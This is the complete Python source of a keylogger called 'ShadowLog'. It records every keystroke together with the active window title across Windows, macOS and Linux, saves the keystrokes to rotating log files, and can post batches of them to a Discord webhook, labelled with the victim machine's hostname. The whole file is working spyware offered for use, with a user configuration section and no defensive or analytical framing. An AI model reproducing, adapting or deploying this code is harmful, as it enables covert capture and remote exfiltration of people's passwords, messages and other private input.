import sys
import logging
import platform
from enum import Enum, auto
from threading import Event, Lock
from pathlib import Path
from datetime import datetime
from dataclasses import dataclass

# --- Dependency Checks ---
try:
    from pynput import keyboard
    from pynput.keyboard import Key, KeyCode
except ImportError:
    print("Error: pynput not installed. Run: pip install pynput")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("Warning: requests not installed. Webhook delivery disabled")
    requests = None

# OS-Specific Imports
if platform.system() == "Windows":
    try:
        import win32gui
        import win32process
        import psutil
    except ImportError:
        win32gui = None
elif platform.system() == "Darwin":
    try:
        from AppKit import NSWorkspace
    except ImportError:
        NSWorkspace = None
elif platform.system() == "Linux":
    try:
        import subprocess
    except ImportError:
        subprocess = None


class KeyType(Enum):
    """Enumeration of keyboard event types for type safety"""
    CHAR = auto()
    SPECIAL = auto()
    UNKNOWN = auto()


@dataclass
class KeyloggerConfig:
    """Configuration for keylogger behavior"""
    log_dir: Path
    log_file_prefix: str = "shadowlog"
    max_log_size_mb: float = 5.0
    webhook_url: str | None = None
    webhook_batch_size: int = 50
    toggle_key: Key = Key.f9
    enable_window_tracking: bool = True
    log_special_keys: bool = True

    def __post_init__(self):
        # Create the directory if it doesn't exist
        self.log_dir.mkdir(parents=True, exist_ok=True)


@dataclass
class KeyEvent:
    """Represents a single keyboard event"""
    timestamp: datetime
    key: str
    window_title: str | None = None
    key_type: KeyType = KeyType.CHAR

    def to_dict(self) -> dict:
        return {
            "timestamp": self.timestamp.isoformat(),
            "key": self.key,
            "window_title": self.window_title or "Unknown",
            "key_type": self.key_type.name.lower()
        }

    def to_log_string(self) -> str:
        time_str = self.timestamp.strftime("%Y-%m-%d %H:%M:%S")
        window_info = f" [{self.window_title}]" if self.window_title else ""
        return f"[{time_str}]{window_info} {self.key}"


class WindowTracker:
    """Tracks active window titles across different operating systems"""
    @staticmethod
    def get_active_window() -> str | None:
        system = platform.system()
        if system == "Windows" and win32gui:
            return WindowTracker._get_windows_window()
        if system == "Darwin" and NSWorkspace:
            return WindowTracker._get_macos_window()
        if system == "Linux":
            return WindowTracker._get_linux_window()
        return None

    @staticmethod
    def _get_windows_window() -> str | None:
        try:
            window = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(window)
            process = psutil.Process(pid)
            window_title = win32gui.GetWindowText(window)
            return f"{process.name()} - {window_title}" if window_title else process.name()
        except Exception:
            return None

    @staticmethod
    def _get_macos_window() -> str | None:
        try:
            active_app = NSWorkspace.sharedWorkspace().activeApplication()
            return active_app.get('NSApplicationName', 'Unknown')
        except Exception:
            return None

    @staticmethod
    def _get_linux_window() -> str | None:
        try:
            result = subprocess.run(
                ['xdotool', 'getactivewindow', 'getwindowname'],
                capture_output=True, text=True, timeout=1, check=False
            )
            return result.stdout.strip() if result.returncode == 0 else None
        except Exception:
            return None


class LogManager:
    """Manages log file rotation and writing"""
    def __init__(self, config: KeyloggerConfig):
        self.config = config
        self.current_log_path = self._get_new_log_path()
        self.lock = Lock()
        self.logger = self._setup_logger()

    def _setup_logger(self) -> logging.Logger:
        logger = logging.getLogger("shadowlog")
        logger.setLevel(logging.INFO)
        if logger.hasHandlers():
            logger.handlers.clear()
            
        handler = logging.FileHandler(self.current_log_path, encoding='utf-8')
        handler.setFormatter(logging.Formatter('%(message)s'))
        logger.addHandler(handler)
        return logger

    def _get_new_log_path(self) -> Path:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        return self.config.log_dir / f"{self.config.log_file_prefix}_{timestamp}.txt"

    def write_event(self, event: KeyEvent) -> None:
        with self.lock:
            self.logger.info(event.to_log_string())
            self._check_rotation()

    def _check_rotation(self) -> None:
        if not self.current_log_path.exists():
            return
            
        current_size_mb = self.current_log_path.stat().st_size / (1024 * 1024)
        if current_size_mb >= self.config.max_log_size_mb:
            self.logger.handlers[0].close()
            self.logger.removeHandler(self.logger.handlers[0])
            
            self.current_log_path = self._get_new_log_path()
            handler = logging.FileHandler(self.current_log_path, encoding='utf-8')
            handler.setFormatter(logging.Formatter('%(message)s'))
            self.logger.addHandler(handler)


class WebhookDelivery:
    """Handles batched delivery of logs to remote webhook"""
    def __init__(self, config: KeyloggerConfig):
        self.config = config
        self.event_buffer: list[KeyEvent] = []
        self.buffer_lock = Lock()
        self.enabled = bool(config.webhook_url and requests)

    def add_event(self, event: KeyEvent) -> None:
        if not self.enabled:
            return
        with self.buffer_lock:
            self.event_buffer.append(event)
            if len(self.event_buffer) >= self.config.webhook_batch_size:
                self._deliver_batch()

    def _deliver_batch(self) -> None:
        if not self.event_buffer or not self.config.webhook_url:
            return
        
        log_content = ""
        for event in self.event_buffer:
            log_content += f"{event.to_log_string()}\n"

        # Format for Discord (using Code Blocks)
        payload = {
            "content": f"**ShadowLog Report** from `{platform.node()}`\n```\n{log_content}\n```"
        }

        try:
            response = requests.post(self.config.webhook_url, json=payload, timeout=5)
            # Accept 204 (No Content) and 200 (OK) as success
            if 200 <= response.status_code < 300:
                self.event_buffer.clear()
            else:
                logging.error(f"Webhook failed: Status {response.status_code} - {response.text}")
        except Exception as e:
            logging.error("Webhook delivery failed: %s", e)

    def flush(self) -> None:
        with self.buffer_lock:
            self._deliver_batch()


class Keylogger:
    """Main keylogger class"""
    def __init__(self, config: KeyloggerConfig):
        self.config = config
        self.log_manager = LogManager(config)
        self.webhook = WebhookDelivery(config)
        self.window_tracker = WindowTracker()
        
        self.is_running = Event()
        self.is_logging = Event()
        self.listener = None
        
        self._current_window = None
        self._last_window_check = datetime.now()

    def _update_active_window(self) -> None:
        if not self.config.enable_window_tracking:
            return
        now = datetime.now()
        if (now - self._last_window_check).total_seconds() >= 0.5:
            self._current_window = self.window_tracker.get_active_window()
            self._last_window_check = now

    def _process_key(self, key: Key | KeyCode) -> tuple[str, KeyType]:
        special_keys = {
            Key.space: "[SPACE]", Key.enter: "[ENTER]", Key.tab: "[TAB]",
            Key.backspace: "[BACKSPACE]", Key.delete: "[DELETE]",
            Key.shift: "[SHIFT]", Key.shift_r: "[SHIFT]",
            Key.ctrl: "[CTRL]", Key.ctrl_r: "[CTRL]",
            Key.alt: "[ALT]", Key.alt_r: "[ALT]",
            Key.cmd: "[CMD]", Key.cmd_r: "[CMD]",
            Key.esc: "[ESC]", 
            Key.up: "[UP]", Key.down: "[DOWN]", 
            Key.left: "[LEFT]", Key.right: "[RIGHT]",
        }

        if isinstance(key, Key):
            if key in special_keys:
                return special_keys[key], KeyType.SPECIAL
            return f"[{key.name.upper()}]", KeyType.SPECIAL

        if hasattr(key, 'char') and key.char:
            return key.char, KeyType.CHAR

        return "[UNKNOWN]", KeyType.UNKNOWN

    def _on_press(self, key) -> None:
        if key == self.config.toggle_key:
            self._toggle_logging()
            return

        if not self.is_logging.is_set():
            return

        self._update_active_window()
        key_str, key_type = self._process_key(key)

        if key_type == KeyType.SPECIAL and not self.config.log_special_keys:
            return

        event = KeyEvent(
            timestamp=datetime.now(),
            key=key_str,
            window_title=self._current_window,
            key_type=key_type
        )

        self.log_manager.write_event(event)
        self.webhook.add_event(event)

    def _toggle_logging(self) -> None:
        if self.is_logging.is_set():
            self.is_logging.clear()
            print("\n[*] ShadowLog paused. Press F9 to resume.")
        else:
            self.is_logging.set()
            print("\n[*] ShadowLog resumed. Press F9 to pause.")

    def start(self) -> None:
        print("="*40)
        print(" 🕵️  ShadowLog - Advanced Activity Monitor")
        print("="*40)
        print(f"📁 Log Directory: {self.config.log_dir}")
        print(f"📄 Current Log:   {self.log_manager.current_log_path.name}")
        print(f"⌨️  Toggle Key:    {self.config.toggle_key.name.upper()}")
        print(f"📡 Webhook:       {'Active ✅' if self.webhook.enabled else 'Disabled ❌'}")
        print("-" * 40)
        print("[*] Press F9 to start/stop logging")
        print("[*] Press CTRL+C to exit")
        print("="*40 + "\n")

        self.is_running.set()
        self.is_logging.set()

        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()

        try:
            while self.is_running.is_set():
                self.listener.join(timeout=1.0)
        except KeyboardInterrupt:
            self.stop()

    def stop(self) -> None:
        print("\n\n[*] Shutting down ShadowLog...")
        self.is_running.clear()
        self.is_logging.clear()
        if self.listener:
            self.listener.stop()
        self.webhook.flush()
        print(f"[*] Logs saved successfully.")
        print("[*] Goodbye.")


def main() -> None:
    # =========================================================================
    # ⚙️ USER CONFIGURATION
    # =========================================================================
    
    # 1. WHERE TO SAVE LOGS
    # Replace 'Path.home() / "logs"' with your custom path if needed.
    # Example: Path(r"E:\KeyLogger\Logs")
    LOG_PATH = Path(r"E:\KeyLogger\Logs") 

    # 2. REMOTE LOGGING (OPTIONAL)
    # Paste your Discord Webhook URL inside the quotes below.
    # Leave as None to disable remote logging.
    DISCORD_WEBHOOK_URL = None 
    # Example: "https://discord.com/api/webhooks/12345/abcdefg..."

    # 3. SETTINGS
    BATCH_SIZE = 50   # Number of keys to collect before sending to Discord
    MAX_FILE_SIZE = 5.0 # Max size of local log file in MB

    # =========================================================================

    config = KeyloggerConfig(
        log_dir = LOG_PATH,
        max_log_size_mb = MAX_FILE_SIZE,
        webhook_url = DISCORD_WEBHOOK_URL,
        webhook_batch_size = BATCH_SIZE,
        toggle_key = Key.f9,
        enable_window_tracking = True,
        log_special_keys = True
    )

    keylogger = Keylogger(config)

    try:
        keylogger.start()
    except Exception as e:
        print(f"\n[!] Critical Error: {e}")
        keylogger.stop()


if __name__ == "__main__":
    main()
